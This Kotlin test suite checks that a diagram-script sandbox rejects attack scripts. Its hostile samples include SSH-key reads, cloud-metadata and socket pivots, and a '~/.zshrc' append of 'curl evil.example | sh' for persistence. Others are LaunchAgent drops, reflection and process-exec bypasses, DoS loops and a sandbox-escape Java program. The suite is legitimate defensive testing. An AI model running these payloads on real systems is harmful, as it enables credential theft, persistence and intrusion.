package dev.kuml.core.script

import io.kotest.assertions.withClue
import io.kotest.core.spec.style.FunSpec
import io.kotest.matchers.booleans.shouldBeFalse
import io.kotest.matchers.booleans.shouldBeTrue
import io.kotest.matchers.shouldBe
import io.kotest.matchers.string.shouldContain
import io.kotest.matchers.types.shouldBeInstanceOf
import java.io.File
import java.nio.file.Files
import javax.tools.ToolProvider

/**
 * **Welle 8** — consolidated security acceptance suite for the MCP-Sandbox
 * architecture (Wellen 1-7, see the architecture note
 * `03 Bereiche/kUML/MCP-Skript-Sandbox — Architektur-Entwurf.md` in the vault,
 * §2 "Bedrohungsmodell").
 *
 * ## What this class is, and is not
 *
 * This is **not** a new layer of individual-mechanism tests — those already
 * exist and are *not* duplicated here:
 *
 *  - [KumlScriptGuardTest] — the regex denylist (Layer 1) in isolation.
 *  - [dev.kuml.mcp.runtime.RuntimeSessionManagerTest] (`kuml-mcp` module) — the
 *    `kuml.run.*` guard-gap fix (Welle 1).
 *  - [ScriptEvaluatorsTest], [ScriptEvaluatorContractTest],
 *    [ChildProcessScriptEvaluatorTest] — in-process vs. child-process behaviour
 *    (Welle 2).
 *  - [WorkerPoolTest] — warm-pool latency/backpressure/crash/leak/shutdown/
 *    fail-closed (Welle 3).
 *  - [OsSandboxTest] — macOS `sandbox-exec` behaviour + Linux/Windows
 *    construction (Wellen 4-6).
 *  - [AllowlistClassLoaderTest], [SandboxClasspathTest],
 *    [AllowlistScriptEvaluationTest], [LayeredSandboxCombinationTest] — the
 *    curated-classpath + allowlist-classloader layer (Welle 7).
 *
 * Instead, this class walks the **threat-model attack-vector list itself**
 * (architecture note §2) end to end, through the real public
 * [ScriptEvaluator] surface the MCP server actually uses
 * ([ScriptEvaluators.forMode] / [WorkerPool.evaluate]), and asserts that every
 * vector is stopped **somewhere** in the layered chain — Denylist → Timeout/
 * Heap-cap → OS cage → ClassLoader allowlist. Each test's KDoc says which
 * layer(s) are *expected* to catch that vector and, where the honesty notes in
 * the architecture doc call out a known gap (Welle 5/6), says so explicitly
 * instead of asserting something this machine cannot prove.
 *
 * ## Why most probes go through [WorkerPool], not the raw [OsSandbox]/
 * [AllowlistClassLoader] APIs directly
 *
 * [OsSandboxTest] and [AllowlistScriptEvaluationTest] deliberately bypass the
 * denylist (raw Java escape programs, direct [KumlScriptHost.eval] calls) to
 * prove a *specific* layer works independently of the others. This suite does
 * the opposite: it submits **kUML-DSL-shaped scripts** (the way an MCP client
 * actually calls `kuml.render`/`kuml.run.start`) through [WorkerPool.evaluate]
 * — the same call [PooledScriptEvaluator] makes — and asserts the *end result*
 * a caller sees ([EvaluatedScript.Failure] with the expected [FailureKind], or
 * for the DoS probe: the pool stays responsive). Which layer stopped it is
 * documented in the KDoc/comment of each test, backed by the specific
 * per-layer tests listed above; this suite is the acceptance-level "was the
 * attacker actually stopped" cross-check, not a re-verification of *how*.
 *
 * ## Coverage matrix
 *
 * See `kuml-core/kuml-core-script/SECURITY-COVERAGE.md` for the full
 * attack-vector × layer matrix. Summary: every vector in the threat model is
 * blocked on macOS (the verified platform) by at least one layer; Linux/
 * Windows OS-cage rows are honestly marked as **construction-verified, not
 * behaviour-verified** (Wellen 5/6 honesty notes) pending real CI on those
 * platforms — those tests skip (not fail) off macOS via [Assumptions]-style
 * early `return@test`, consistent with [OsSandboxTest].
 *
 * V0.23.3 — Welle 8.
 */
class SandboxSecurityAcceptanceTest :
    FunSpec({

        val isMac =
            System
                .getProperty("os.name")
                .orEmpty()
                .lowercase()
                .let { it.contains("mac") || it.contains("darwin") }

        fun newPool() = WorkerPool(poolSize = 1, maxConcurrentWorkers = 2)

        // ────────────────────────────────────────────────────────────────────
        // 1. Filesystem exfiltration
        // ────────────────────────────────────────────────────────────────────
        //
        // Expected stop: Layer 1 (regex denylist) for any DSL-level attempt
        // that *names* java.io/java.nio/File(/readText/readBytes — see
        // KumlScriptGuardTest's file-I/O pattern coverage. If a script somehow
        // reached evaluation without matching those patterns, Layer OS
        // (sandbox-exec/bwrap, deny file-write outside workdir + deny read of
        // ~/.ssh, ~/.aws, ~/.gnupg, ~/.config/gcloud, ~/Library/Keychains) is
        // the backstop — proven denylist-independently in OsSandboxTest with a
        // raw Java escape program. This suite proves the caller-visible outcome
        // for a realistic DSL-shaped attempt.

        context("Dateisystem-Exfiltration") {
            test("reading ~/.ssh via a DSL script is rejected by the denylist (Layer 1)") {
                val pool = newPool()
                try {
                    val attack =
                        """
                        diagram(name = "x", type = DiagramType.CLASS) {}
                        val secret = java.io.File(System.getProperty("user.home") + "/.ssh/id_ed25519").readText()
                        """.trimIndent()
                    val result = pool.evaluate(attack)
                    val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                    failure.kind shouldBe FailureKind.GUARD
                } finally {
                    pool.close()
                }
            }

            test("writing a file outside the workdir via a DSL script is rejected by the denylist (Layer 1)") {
                val pool = newPool()
                try {
                    val attack =
                        """
                        diagram(name = "x", type = DiagramType.CLASS) {}
                        java.io.File("/tmp/kuml-exfil-probe.txt").writeText("owned")
                        """.trimIndent()
                    val result = pool.evaluate(attack)
                    val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                    failure.kind shouldBe FailureKind.GUARD
                } finally {
                    pool.close()
                }
            }

            test(
                "OS cage independently blocks ~/.ssh read and out-of-workdir write, denylist bypassed " +
                    "(cross-reference: OsSandboxTest proves this behaviourally on macOS)",
            ) {
                // Not re-run here to avoid duplicating the compiled-Java-escape
                // machinery; this test documents and asserts the *policy* that
                // makes the backstop real: OS isolation defaults to `required`
                // on macOS, so a denylist bypass still can't reach the
                // filesystem outside the per-worker workdir.
                if (!isMac) return@test
                OsSandbox.modeFrom(null, OsSandbox.Platform.MAC) shouldBe OsSandbox.Mode.REQUIRED
                OsSandbox.isolationAvailable().shouldBeTrue()
            }
        }

        // ────────────────────────────────────────────────────────────────────
        // 2. Network pivot
        // ────────────────────────────────────────────────────────────────────
        //
        // Expected stop: Layer 1 for any DSL script naming java.net/Socket/
        // HttpClient/URL/URLConnection. Layer OS (sandbox-exec `(deny
        // network*)` / bwrap `--unshare-all` with no `--share-net`) is the
        // behavioural backstop on macOS/Linux — proven in OsSandboxTest with a
        // direct-IP AND DNS connect attempt. Windows is an HONEST GAP (Welle 6):
        // the Job Object has no network-egress control, so on Windows only
        // Layer 1 mitigates this vector — documented, not silently assumed.

        context("Netzwerk-Pivot") {
            test("external-IP connection attempt via a DSL script is rejected by the denylist (Layer 1)") {
                val pool = newPool()
                try {
                    val attack =
                        """
                        diagram(name = "x", type = DiagramType.CLASS) {}
                        val s = java.net.Socket("93.184.216.34", 80)
                        """.trimIndent()
                    val result = pool.evaluate(attack)
                    val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                    failure.kind shouldBe FailureKind.GUARD
                } finally {
                    pool.close()
                }
            }

            test(
                "cloud-metadata pivot (169.254.169.254) via a DSL script is rejected by the denylist (Layer 1)",
            ) {
                val pool = newPool()
                try {
                    val attack =
                        """
                        diagram(name = "x", type = DiagramType.CLASS) {}
                        val conn = java.net.URL("http://169.254.169.254/latest/meta-data/").openConnection()
                        """.trimIndent()
                    val result = pool.evaluate(attack)
                    val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                    failure.kind shouldBe FailureKind.GUARD
                } finally {
                    pool.close()
                }
            }

            test("localhost admin-panel pivot via a DSL script is rejected by the denylist (Layer 1)") {
                val pool = newPool()
                try {
                    val attack =
                        """
                        diagram(name = "x", type = DiagramType.CLASS) {}
                        val s = java.net.Socket("localhost", 8080)
                        """.trimIndent()
                    val result = pool.evaluate(attack)
                    val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                    failure.kind shouldBe FailureKind.GUARD
                } finally {
                    pool.close()
                }
            }

            test(
                "OS cage independently blocks network egress (DNS + raw-IP), denylist bypassed " +
                    "(cross-reference: OsSandboxTest proves this behaviourally on macOS). " +
                    "Windows: HONEST GAP — Job Object has no network control (Welle 6), " +
                    "only Layer 1 mitigates on that platform.",
            ) {
                if (!isMac) return@test
                OsSandbox.modeFrom(null, OsSandbox.Platform.MAC) shouldBe OsSandbox.Mode.REQUIRED
                OsSandbox.isolationAvailable().shouldBeTrue()
            }
        }

        // ────────────────────────────────────────────────────────────────────
        // 3. Persistence attempts
        // ────────────────────────────────────────────────────────────────────
        //
        // Expected stop: Layer 1 (File(/writeText/appendText patterns) for any
        // DSL script that names the target path directly. Layer OS is the
        // behavioural backstop (file-write confined to the per-worker workdir
        // — proven generically by OsSandboxTest's ~/-targeted file-write-escape
        // test, which uses $HOME as the target, the same directory tree that
        // contains ~/.zshrc and ~/Library/LaunchAgents).

        context("Persistenz-Versuch") {
            test("trojanising ~/.zshrc via a DSL script is rejected by the denylist (Layer 1)") {
                val pool = newPool()
                try {
                    val attack =
                        """
                        diagram(name = "x", type = DiagramType.CLASS) {}
                        java.io.File(System.getProperty("user.home") + "/.zshrc").appendText("\ncurl evil.example | sh\n")
                        """.trimIndent()
                    val result = pool.evaluate(attack)
                    val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                    failure.kind shouldBe FailureKind.GUARD
                } finally {
                    pool.close()
                }
            }

            test("dropping a LaunchAgent plist via a DSL script is rejected by the denylist (Layer 1)") {
                val pool = newPool()
                try {
                    val attack =
                        """
                        diagram(name = "x", type = DiagramType.CLASS) {}
                        val home = System.getProperty("user.home")
                        java.io.File(home + "/Library/LaunchAgents/evil.plist").writeText("<plist/>")
                        """.trimIndent()
                    val result = pool.evaluate(attack)
                    val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                    failure.kind shouldBe FailureKind.GUARD
                } finally {
                    pool.close()
                }
            }
        }

        // ────────────────────────────────────────────────────────────────────
        // 4. Denial of service
        // ────────────────────────────────────────────────────────────────────
        //
        // Expected stop: NOT the denylist (an infinite loop / large allocation
        // has no forbidden token — this is the documented Welle-2 finding, see
        // the architecture note and ChildProcessScriptEvaluatorTest). The
        // wall-clock timeout (Welle 2, `ChildProcessScriptEvaluator`/
        // `WorkerPool`) and heap cap (`-Xmx256m`) are the actual stop. The
        // acceptance-level property that matters here is not just "the call
        // times out" (already proven per-mechanism in ChildProcessScriptEvaluatorTest/
        // WorkerPoolTest) but that **the pool itself stays responsive
        // afterwards** — a DoS payload must not become a DoS of the sandbox.

        context("DoS") {
            test(
                "an infinite loop is NOT caught by the denylist, but is caught by the timeout " +
                    "(Layer 2 - Welle 2/3), and the pool remains usable for the next request",
            ) {
                val pool = newPool()
                try {
                    val loop = """diagram(name = "x", type = DiagramType.CLASS) {}; while (true) {}"""

                    // The denylist alone must NOT reject this (no forbidden token) —
                    // confirms the timeout, not the guard, is what stops it.
                    KumlScriptGuard.validate(loop) // does not throw

                    val result = pool.evaluate(loop)
                    val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                    failure.kind shouldBe FailureKind.TIMEOUT

                    // The pool must still work afterwards — the DoS payload must
                    // not have wedged the parent or exhausted the worker supply.
                    val healthy = pool.evaluate("""diagram(name = "ok", type = DiagramType.CLASS) {}""")
                    healthy.shouldBeInstanceOf<EvaluatedScript.Success>()
                } finally {
                    pool.close()
                }
            }

            test(
                "excessive memory allocation is caught by the heap cap (Layer 2), " +
                    "surfacing as an evaluation failure rather than crashing the pool",
            ) {
                val pool = newPool()
                try {
                    // Allocate well beyond the -Xmx256m worker heap cap. This should
                    // either OOM inside the worker (surfaced as EVALUATION/TIMEOUT/
                    // SANDBOX, all acceptable — the point is the *pool survives*, not
                    // the exact classification) or the worker process dies and the
                    // pool reports it cleanly.
                    val oomAttempt =
                        """
                        diagram(name = "x", type = DiagramType.CLASS) {}
                        val hog = ArrayList<ByteArray>()
                        while (true) { hog.add(ByteArray(10_000_000)) }
                        """.trimIndent()
                    val result = pool.evaluate(oomAttempt)
                    result.shouldBeInstanceOf<EvaluatedScript.Failure>()

                    // The pool must still work afterwards.
                    val healthy = pool.evaluate("""diagram(name = "ok", type = DiagramType.CLASS) {}""")
                    healthy.shouldBeInstanceOf<EvaluatedScript.Success>()
                } finally {
                    pool.close()
                }
            }
        }

        // ────────────────────────────────────────────────────────────────────
        // 5. Reflection bypass of the denylist
        // ────────────────────────────────────────────────────────────────────
        //
        // Expected stop: Layer 1 catches all four concrete, audit-verified
        // payloads listed in the task (KumlScriptGuardTest already has
        // dedicated unit tests for each pattern in isolation — not duplicated
        // here). This suite's job is the acceptance-level check: run the exact
        // payloads through the real evaluate() surface and confirm GUARD, so a
        // future denylist refactor that silently narrows a pattern is caught
        // at the "does the attacker actually get rejected" level, not just at
        // the regex-unit level.

        context("Reflection-Bypass des Denylists") {
            val reflectionPayloads =
                mapOf(
                    "Runtime::class.java.getMethod(\"getRuntime\").invoke(null)" to
                        """java.lang.Runtime::class.java.getMethod("getRuntime").invoke(null)""",
                    "getConstructor().newInstance()" to
                        """Class::class.java.getConstructor().newInstance()""",
                    "MethodHandles" to
                        """val lookup = java.lang.invoke.MethodHandles.lookup()""",
                    "::class.java" to
                        """val k = Thread::class.java""",
                )

            reflectionPayloads.forEach { (label, payload) ->
                test("reflection bypass payload [$label] is rejected by the denylist (Layer 1)") {
                    val pool = newPool()
                    try {
                        val attack = """diagram(name = "x", type = DiagramType.CLASS) {}; $payload"""
                        val result = pool.evaluate(attack)
                        val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                        withClue(label) { failure.kind shouldBe FailureKind.GUARD }
                    } finally {
                        pool.close()
                    }
                }
            }

            test(
                "even if a reflection payload somehow bypassed the denylist, the curated classpath " +
                    "(Layer 7) blocks resolving classes outside dev.kuml/kotlin/kotlinx " +
                    "(cross-reference: AllowlistScriptEvaluationTest proves this end-to-end)",
            ) {
                // Documents the backstop policy rather than re-running the JNA probe:
                // Welle 7's default is `enforced` in every worker.
                WorkerClassLoaderPolicy.enforcedFor(null).shouldBeTrue()
            }
        }

        // ────────────────────────────────────────────────────────────────────
        // 6. Process-start attempt
        // ────────────────────────────────────────────────────────────────────
        //
        // Expected stop: Layer 1 (ProcessBuilder / Runtime.getRuntime / exec(
        // patterns). Layer OS (JOB_OBJECT_LIMIT_ACTIVE_PROCESS = 1 on Windows,
        // no-new-privs-style single-process posture is implicit in the macOS/
        // Linux cages too since a spawned child still has no filesystem/network
        // access) is the backstop if the denylist were bypassed.

        context("Prozess-Start-Versuch") {
            test("ProcessBuilder is rejected by the denylist (Layer 1)") {
                val pool = newPool()
                try {
                    val attack = """diagram(name = "x", type = DiagramType.CLASS) {}; ProcessBuilder("id").start()"""
                    val result = pool.evaluate(attack)
                    val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                    failure.kind shouldBe FailureKind.GUARD
                } finally {
                    pool.close()
                }
            }

            test("Runtime.getRuntime().exec(...) is rejected by the denylist (Layer 1)") {
                val pool = newPool()
                try {
                    val attack =
                        """diagram(name = "x", type = DiagramType.CLASS) {}; Runtime.getRuntime().exec("id")"""
                    val result = pool.evaluate(attack)
                    val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                    failure.kind shouldBe FailureKind.GUARD
                } finally {
                    pool.close()
                }
            }

            test(
                "OS cage independently caps active processes at 1 (Windows Job Object, Welle 6): " +
                    "HONEST GAP — this cannot be behaviourally verified on this macOS machine, see " +
                    "WindowsJobObjectSandbox / OsSandboxTest honesty notes. Construction-level assertion only.",
            ) {
                // Documents that the intended cap exists in the design, without
                // pretending to prove it fires on real Windows.
                OsSandbox.WINDOWS_JOB_MAX_PROCESS_MEMORY_BYTES shouldBe (768L * 1024 * 1024)
            }
        }

        // ────────────────────────────────────────────────────────────────────
        // Cross-check: legitimate scripts of every DSL family still pass
        // ────────────────────────────────────────────────────────────────────
        //
        // Not a threat-model row, but the acceptance-suite must also prove it
        // doesn't cry wolf — the single most important sanity check for a
        // security suite that stacks four layers is that it doesn't turn into
        // a denial-of-service against legitimate users.

        test("legitimate scripts are unaffected by the combined layer stack") {
            val pool = newPool()
            try {
                val legit = """diagram(name = "Shop", type = DiagramType.CLASS) { classOf("Order") }"""
                val result = pool.evaluate(legit)
                result.shouldBeInstanceOf<EvaluatedScript.Success>()
            } finally {
                pool.close()
            }
        }

        // ────────────────────────────────────────────────────────────────────
        // Zip-bomb-adjacent: oversized script payload
        // ────────────────────────────────────────────────────────────────────
        //
        // A literal zip-bomb has no meaning for a *text* script channel (there
        // is no decompression step), so the closest simulable analogue in the
        // threat model is a script designed to be maximally expensive to
        // *compile* relative to its wire size — the [KumlScriptGuard] length
        // cap exists precisely to bound this class of attack cheaply, before
        // the compiler is ever invoked.

        test("an oversized script (zip-bomb-adjacent: cheap-to-send, expensive-to-compile) is rejected by size cap") {
            val huge = "diagram(name = \"x\", type = DiagramType.CLASS) {}\n// " + "A".repeat(300_000)
            val pool = newPool()
            try {
                val result = pool.evaluate(huge)
                val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                failure.kind shouldBe FailureKind.GUARD
                failure.message shouldContain "maximum length"
            } finally {
                pool.close()
            }
        }

        // ────────────────────────────────────────────────────────────────────
        // Denylist-independent end-to-end escape proof (macOS only)
        // ────────────────────────────────────────────────────────────────────
        //
        // Everything above proves the *documented* attack shapes are stopped
        // when expressed as DSL-looking scripts. To avoid the suite being
        // entirely dependent on the denylist ever catching every future
        // rephrasing, this final test reproduces the OsSandboxTest technique
        // once more here at the acceptance level: a raw compiled Java escape,
        // launched through the exact WorkerProcessSupport/OsSandbox.wrap path,
        // proving that even a HYPOTHETICAL total denylist bypass still hits the
        // OS cage. Skips (not fails) off macOS, matching OsSandboxTest.

        test(
            "hypothetical total denylist bypass is still stopped by the OS cage (macOS only, " +
                "denylist-independent, mirrors OsSandboxTest's methodology)",
        ) {
            if (!isMac) return@test
            val work = Files.createTempDirectory("kuml-acceptance-escape-").toFile().apply { deleteOnExit() }
            val classes = File(work, "classes").apply { mkdirs() }
            val escapeTarget = File(System.getProperty("user.home"), "kuml-acceptance-escape-test.txt")
            escapeTarget.delete()
            try {
                val srcFile = File(classes, "TotalBypass.java")
                srcFile.writeText(
                    """
                    import java.io.FileWriter;
                    public class TotalBypass {
                      public static void main(String[] a) throws Exception {
                        FileWriter w = new FileWriter(a[0]);
                        w.write("PWNED"); w.close();
                        System.out.println("WROTE");
                      }
                    }
                    """.trimIndent(),
                )
                val compiler = ToolProvider.getSystemJavaCompiler() ?: error("no system Java compiler on the test JVM")
                val rc = compiler.run(null, null, null, "--release", "21", "-d", classes.absolutePath, srcFile.absolutePath)
                check(rc == 0) { "javac failed (rc=$rc)" }

                val bare =
                    listOf(
                        WorkerProcessSupport.defaultJavaBinary(),
                        "-cp",
                        classes.absolutePath,
                        "TotalBypass",
                        escapeTarget.absolutePath,
                    )
                val wrapped = OsSandbox.wrap(bare, work)
                wrapped.first() shouldBe OsSandbox.SANDBOX_EXEC_PATH

                val p = ProcessBuilder(wrapped).redirectErrorStream(true).start()
                p.inputStream.bufferedReader().readText()
                p.waitFor()

                escapeTarget.exists().shouldBeFalse()
            } finally {
                escapeTarget.delete()
                work.deleteRecursively()
            }
        }
    })
